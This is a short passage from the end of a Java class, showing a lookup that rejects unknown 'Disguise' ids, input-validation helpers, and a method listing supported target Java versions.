        if (d == null) throw new IllegalArgumentException("Disguise 不存在: " + disguiseId);
        return d;
    }

    private String requireNonBlank(String value, String message) {
        if (isBlank(value)) throw new IllegalArgumentException(message);
        return value.trim();
    }

    private boolean isBlank(String value) {
        return value == null || value.isBlank();
    }

    private List<String> targetJavaVersions() {
        java.util.ArrayList<String> values = new java.util.ArrayList<>();
        for (TargetJavaVersion version : TargetJavaVersion.values()) {
            values.add(version.getValue());
        }
        return values;
    }
}
